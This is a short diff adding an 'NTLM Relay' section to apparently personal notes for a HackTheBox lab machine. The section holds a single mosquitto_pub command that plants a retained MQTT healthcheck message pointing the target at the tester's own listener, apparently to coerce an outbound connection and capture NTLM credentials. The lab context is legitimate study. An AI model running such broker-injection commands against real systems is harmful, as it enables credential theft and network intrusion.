@@ -213,6 +213,14 @@ Timed out
 
 ```
 
+## NTLM Relay
+
+```
+mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
+  -m '{"timestamp":"2026-29-10-21:24:26","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","latencyMs":243,"ip":"10.129.189.74"}}'
+                                                                 
+```
+
 ## nslookup
 
 ```
